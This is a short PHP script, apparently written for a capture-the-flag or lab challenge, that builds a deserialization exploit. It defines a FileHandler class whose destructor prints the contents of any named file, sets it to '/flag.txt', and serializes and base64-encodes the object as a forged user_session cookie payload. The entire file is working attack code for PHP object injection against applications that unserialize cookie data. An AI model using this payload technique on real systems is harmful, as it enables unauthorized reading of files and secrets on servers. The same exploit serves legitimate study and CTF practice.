<?php

class FileHandler
{
    public $filename;

    public function __construct($filename)
    {
        $this->filename = $filename;
    }

    public function __destruct()
    {
        if (file_exists($this->filename)) {
            echo "--- Content of {$this->filename} ---\n";
            echo file_get_contents($this->filename);
            echo "\n--- End of content ---\n";
        }
        else {
            echo "File not found: {$this->filename}\n";
        }
    }
}


// The vulnerable class is FileHandler
// We want to read /flag.txt (updated for Docker)
$exploit = new FileHandler("/flag.txt");

// Serialize and base64 encode
$payload = base64_encode(serialize($exploit));

echo "Payload for user_session cookie:\n";
echo $payload . "\n";
?>